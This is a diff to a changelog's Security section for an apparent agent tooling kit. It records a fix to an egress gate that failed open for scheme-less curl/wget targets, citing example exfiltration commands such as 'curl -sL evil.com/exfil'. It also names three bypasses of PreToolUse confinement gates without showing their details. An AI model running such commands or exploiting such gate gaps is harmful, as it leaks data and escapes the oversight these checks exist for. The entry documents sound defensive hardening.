@@ -36,6 +36,18 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/).
 
 ### Security
 
+- **egress-gate now enforces scheme-less `curl`/`wget` targets.** Network-target extraction
+  parsed only explicit `http(s)://` URLs, so `curl evil.com`, `wget evil.com/x`, and
+  `curl -sL evil.com/exfil` — the most common egress forms — produced zero hosts and the signed
+  `[scope].egress` allowlist was **not enforced** for them (a fail-open the sweep flagged). A
+  second, still-conservative extraction pass now reads the positional argument of `curl`/`wget`
+  as a network target, skipping value-taking flags (`-o out.txt`, `-H`, `-d @data.json`, …) so
+  their arguments are never mistaken for hosts, and only accepting a strict dotted-domain shape
+  (zero false positives — `localhost`, bare words, and `-o`/`-d` values are not treated as
+  hosts). Implicit-registry tools (`git`/`npm`/`pip`), non-http schemes, and variable-expanded
+  URLs remain out of reach — command-string inspection is defense-in-depth, documented as such,
+  not a substitute for a network sandbox.
+
 - **exec-broker PreToolUse gates hardened to fail closed (three bypasses, found by an internal
   bug sweep).** The runtime enforcement point (`kit gate-fs` / `kit gate-egress`) and the CLI's
   gate dispatch had gaps where an attacker or an internal fault could slip past confinement:
